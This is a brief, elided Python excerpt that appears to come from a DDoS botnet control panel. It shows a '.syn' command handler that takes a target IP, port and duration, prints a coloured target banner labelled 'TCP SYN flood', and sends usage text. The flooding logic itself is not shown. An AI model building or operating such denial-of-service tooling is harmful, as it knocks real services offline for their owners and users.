...
def syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        ...
        xxxx = '''%s============= (%sTARGET%s) ==============
            ...
            %sPORT:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTWHITE_EX, Fore.GREEN, Fore.LIGHTWHITE_EX, Fore.CYAN, Fore.YELLOW, ip, Fore.CYAN, Fore.YELLOW, port, Fore.CYAN, Fore.YELLOW, secs,Fore.CYAN, Fore.YELLOW, 'TCP SYN flood')
        ...
        send(client, f'\nUsage: {Fore.YELLOW}.syn [IP] [PORT] [TIME]')
